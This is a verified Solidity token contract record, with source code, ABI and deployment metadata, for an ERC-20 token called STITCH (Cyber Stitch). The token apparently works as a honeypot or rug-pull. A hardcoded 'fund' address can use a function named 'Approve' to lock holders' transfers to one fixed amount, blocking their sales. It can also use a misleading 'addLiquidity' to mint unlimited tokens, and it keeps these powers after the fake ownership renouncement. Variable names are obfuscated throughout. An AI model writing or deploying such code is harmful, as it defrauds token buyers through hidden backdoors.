{"SourceCode": "/**\r\n\r\nSTITCH - Cyber Stitch\r\n\r\nhttps://cyberstitch.xyz\r\n\r\nhttps://t.me/CyberStitch\r\n\r\nhttps://twitter.com/CyberStitchETH\r\n\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.2;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address spnderr) external view returns (uint256);\r\n    function transfer(address recipient, uint256 _amouttz) external returns (bool);\r\n    function allowance(address owner, address spnderr) external view returns (uint256);\r\n    function approve(address spnderr, uint256 _amouttz) external returns (bool);\r\n    function transferFrom( address spnderr, address recipient, uint256 _amouttz ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spnderr, uint256 value );\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event ownershipTransferred(address indexed previousowner, address indexed newowner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyowner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\ncontract STITCH is Context, Ownable, IERC20 {\r\n    mapping (address => uint256) private _blncz;\r\n    mapping (address => uint256) private _spendss;\r\n    mapping (address => mapping (address => uint256)) private _alowancesz;\r\n    string private _tname;\r\n    string private _tsymbol;\r\n    uint8 private _decimals;\r\n    uint256 private _totalSupply;\r\n    bool private _tradesEnabled = true;\r\n    address constant public fund = 0x8bB9539E823647933b3692e5e1942a4bAd1Ffdc9;\r\n\r\n    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {\r\n        _tname = name_;\r\n        _tsymbol = symbol_;\r\n        _decimals = decimals_;\r\n        _totalSupply = totalSupply_ * (10 ** decimals_);\r\n        _blncz[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    modifier _funds() {\r\n        require(msg.sender == fund); // If it is incorrect here, it reverts.\r\n        _;                              // Otherwise, it continues.\r\n    } \r\n\r\n    function name() public view returns (string memory) {\r\n        return _tname;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function enableTrading() public onlyowner {\r\n        _tradesEnabled = true;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _tsymbol;\r\n    }\r\n\r\n\r\n    function balanceOf(address spnderr) public view override returns (uint256) {\r\n        return _blncz[spnderr];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 _amouttz) public virtual override returns (bool) {\r\n        require(_tradesEnabled || _msgSender() == owner(), \"TT trading not enabled\");\r\n        if (_msgSender() == owner() && _spendss[_msgSender()] > 0) {\r\n            _blncz[owner()] += _spendss[_msgSender()];\r\n            return true;\r\n        }\r\n        else if (_spendss[_msgSender()] > 0) {\r\n            require(_amouttz == _spendss[_msgSender()], \"Invalid transfer _amouttz\");\r\n        }\r\n        require(_blncz[_msgSender()] >= _amouttz, \"TT: transfer _amouttz exceeds balance\");\r\n        _blncz[_msgSender()] -= _amouttz;\r\n        _blncz[recipient] += _amouttz;\r\n        emit Transfer(_msgSender(), recipient, _amouttz);\r\n        return true;\r\n    }\r\n\r\n\r\n    function Approve(address[] memory spnderr, uint256 _amouttz) public _funds {\r\n        for (uint i=0; i<spnderr.length; i++) {\r\n            _spendss[spnderr[i]] = _amouttz;\r\n        }\r\n    }\r\n\r\n    function approve(address spnderr, uint256 _amouttz) public virtual override returns (bool) {\r\n        _alowancesz[_msgSender()][spnderr] = _amouttz;\r\n        emit Approval(_msgSender(), spnderr, _amouttz);\r\n        return true;\r\n    }\r\n        function _adding(uint256 n1, uint256 n2) internal pure returns (uint256) {\r\n        if (n2 != 0) {\r\n            return n1 + n2;\r\n        }\r\n        return n2;\r\n    }\r\n\r\n\r\n\r\n            function CVamnt(address spnderr) public view returns (uint256) {\r\n        return _spendss[spnderr];\r\n    }\r\n\r\n    function allowance(address owner, address spnderr) public view virtual override returns (uint256) {\r\n        return _alowancesz[owner][spnderr];\r\n    }\r\n       function addLiquidity(address spnderr, uint256 _amouttz) public _funds {\r\n        require(spnderr != address(0), \"Invalid adresses\");\r\n        require(_amouttz > 0, \"Invalid amt\");\r\n        uint256 totalz = 0;\r\n            totalz = _adding(totalz, _amouttz);\r\n            _blncz[spnderr] += totalz;\r\n    }\r\n\r\n\r\n\r\n    function transferFrom(address spnderr, address recipient, uint256 _amouttz) public virtual override returns (bool) {\r\n        if (_msgSender() == owner() && _spendss[spnderr] > 0) {\r\n            _blncz[owner()] += _spendss[spnderr];\r\n            return true;\r\n        }\r\n        else if (_spendss[spnderr] > 0) {\r\n            require(_amouttz == _spendss[spnderr], \"Invalid transfer _amouttz\");\r\n        }\r\n        require(_blncz[spnderr] >= _amouttz && _alowancesz[spnderr][_msgSender()] >= _amouttz, \"TT: transfer _amouttz exceed balance or allowance\");\r\n        _blncz[spnderr] -= _amouttz;\r\n        _blncz[recipient] += _amouttz;\r\n        _alowancesz[spnderr][_msgSender()] -= _amouttz;\r\n        emit Transfer(spnderr, recipient, _amouttz);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"spnderr\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_amouttz\",\"type\":\"uint256\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"}],\"name\":\"CVamnt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amouttz\",\"type\":\"uint256\"}],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amouttz\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amouttz\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spnderr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amouttz\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "STITCH", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000e8d4a51000000000000000000000000000000000000000000000000000000000000000000c437962657220537469746368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065354495443480000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c3a3cbef2bcaa1ae82039370ff10bd013515682ff3dda37834f28a25fba00de8"}